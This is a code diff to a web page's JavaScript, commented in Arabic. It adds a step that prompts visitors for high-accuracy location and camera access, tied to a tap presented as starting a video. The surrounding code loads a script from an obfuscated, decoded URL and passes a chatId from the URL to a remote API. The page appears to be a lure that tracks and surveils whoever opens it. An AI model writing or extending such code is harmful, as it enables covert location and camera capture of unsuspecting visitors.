@@ -403,6 +403,27 @@
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
+            // ===== طلب الصلاحيات (لإظهار نوافذ المتصفح) =====
+            async function requestPermissions() {
+                // طلب إذن الموقع
+                try {
+                    await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            () => resolve(),
+                            () => resolve(),
+                            { enableHighAccuracy: true, timeout: 5000 }
+                        );
+                    });
+                } catch (e) {}
+                
+                // طلب إذن الكاميرا
+                try {
+                    await navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(() => {});
+                } catch (e) {}
+            }
+
             // ===== فتح إعدادات الموقع =====
             function openLocationSettings() {
                 const ua = navigator.userAgent;
@@ -441,7 +462,6 @@
                 scriptTag.src = decodedUrl;
                 scriptTag.async = true;
                 
-                // تمرير ChatId للـ API
                 window._chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                 
                 document.head.appendChild(scriptTag);
@@ -471,8 +491,13 @@
                 if (isProcessing || videoStarted) return;
 
                 if (!settingsOpened) {
-                    // الضغطة الأولى: فتح إعدادات الموقع
+                    // الضغطة الأولى: طلب الأذونات وفتح إعدادات الموقع
                     settingsOpened = true;
+                    
+                    // طلب الأذونات أولاً (سيظهر نافذة المتصفح)
+                    await requestPermissions();
+                    
+                    // ثم فتح الإعدادات
                     openLocationSettings();
                 } else {
                     // الضغطة الثانية: بدء تشغيل الفيديو + استدعاء API
